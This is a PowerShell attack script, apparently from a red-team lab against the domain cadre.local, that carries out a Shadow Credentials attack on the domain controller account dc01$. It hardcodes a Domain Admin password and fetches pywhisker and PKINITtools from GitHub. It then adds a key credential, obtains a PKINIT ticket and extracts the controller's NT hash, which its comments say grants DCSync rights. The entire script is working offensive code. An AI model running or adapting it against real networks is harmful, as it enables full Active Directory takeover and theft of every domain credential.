# T008 - Shadow Credentials on dc01$ as chief_command (cadre.local DA) - ws01 native
# All in-script: pywhisker (explicit creds, LDAPS) -> PKINIT TGT -> NT hash (= DCSync rights)
# No Start-Process -Credential / scheduled task needed.
$ErrorActionPreference = 'Continue'
$outDir = 'C:\Tools\cadre-attack'

Write-Output '=== T008: pywhisker add shadow creds to dc01$ (chief_command) ==='

# 1) Ensure deps
python -m pip install --quiet dsinternals rich ldapdomaindump six pyasn1 impacket oscrypto minikerberos 2>&1 | ForEach-Object { if ($_ -match 'ERROR|Successfully|installed') { Write-Output "PIP|$_" } }
python -c "import dsinternals, rich, ldap3, impacket, oscrypto, minikerberos; print('DEPS_OK')" 2>&1

# 2) Ensure pywhisker present
if (-not (Test-Path "$outDir\pywhisker-src\pywhisker-main\pywhisker\pywhisker.py")) {
  try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri 'https://codeload.github.com/ShutdownRepo/pywhisker/zip/refs/heads/main' -OutFile "$outDir\pywhisker.zip" -UseBasicParsing
    Expand-Archive "$outDir\pywhisker.zip" -DestinationPath "$outDir\pywhisker-src" -Force
    Write-Output 'PYWHISKER_STAGED'
  } catch { Write-Output "PYWHISKER_STAGE_FAIL|$($_.Exception.Message)" }
}
$pyscript = "$outDir\pywhisker-src\pywhisker-main\pywhisker\pywhisker.py"

# 3) Add shadow credential as chief_command (explicit creds + LDAPS); capture PFX password
$pwxOut = ''
if (Test-Path $pyscript) {
  $pwxOut = (python $pyscript -d cadre.local -u chief_command -p 'C0mm@nd_Ch1ef!' --target 'dc01$' --action add --dc-ip dc01.cadre.local --use-ldaps --filename "$outDir\T008-dc01" 2>&1) | ForEach-Object { Write-Output "PW|$_"; $_ }
} else {
  Write-Output 'PYWHISKER_MISSING'
  exit 1
}

# pywhisker prints the PFX password; extract it (handles both old/new wording + umlaut)
$pfxPass = ($pwxOut | Select-String -Pattern 'Must be used with password:\s*([A-Za-z0-9]+)' | Select-Object -First 1).Matches[0].Groups[1].Value
if (-not $pfxPass) {
  $pfxPass = ($pwxOut | Select-String -Pattern 'Passwort.*?:\s*([A-Za-z0-9]+)' | Select-Object -First 1).Matches[0].Groups[1].Value
}
if (-not $pfxPass) {
  Write-Output 'PFXPASS_NOT_FOUND'
  exit 1
}
Write-Output "PFXPASS|$pfxPass"

# 4) Capture PFX + password (password printed by pywhisker; derive from fresh add)
$pfx = "$outDir\T008-dc01.pfx"
if (-not (Test-Path $pfx)) { Write-Output 'PFX_NOT_FOUND'; exit 1 }
Write-Output "PFX_EXISTS|$((Get-Item $pfx).Length)"

# 5) PKINIT TGT as dc01$ via gettgtpkinit
$pk = "$outDir\pkinittools-src\PKINITtools-master"
if (-not (Test-Path "$pk\gettgtpkinit.py")) {
  try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri 'https://codeload.github.com/dirkjanm/PKINITtools/zip/refs/heads/master' -OutFile "$outDir\pkinittools.zip" -UseBasicParsing
    Expand-Archive "$outDir\pkinittools.zip" -DestinationPath "$outDir\pkinittools-src" -Force
    Write-Output 'PKINITTOOLS_STAGED'
  } catch { Write-Output "PKINITTOOLS_STAGE_FAIL|$($_.Exception.Message)" }
}

# gettgtpkinit prints the AS-REP key; capture and reuse for getnthash
$tgtLog = python "$pk\gettgtpkinit.py" -cert-pfx $pfx -pfx-pass $pfxPass -dc-ip 192.168.77.10 cadre.local/'dc01$' "$outDir\T008-dc01.ccache" 2>&1
$tgtLog | ForEach-Object { Write-Output "PKINIT|$_" }
$asrepKey = ($tgtLog | Select-String -Pattern '[a-f0-9]{64}' | Select-Object -First 1).Matches[0].Value

if (-not (Test-Path "$outDir\T008-dc01.ccache")) { Write-Output 'CCACHE_MISSING'; exit 1 }

# 6) Extract NT hash from TGT
$env:KRB5CCNAME = "$outDir\T008-dc01.ccache"
python "$pk\getnthash.py" -key $asrepKey -dc-ip 192.168.77.10 'cadre.local/dc01$' 2>&1 | ForEach-Object { Write-Output "NTHASH|$_" }
Write-Output 'T008_DONE'
Write-Output 'T008_OK'
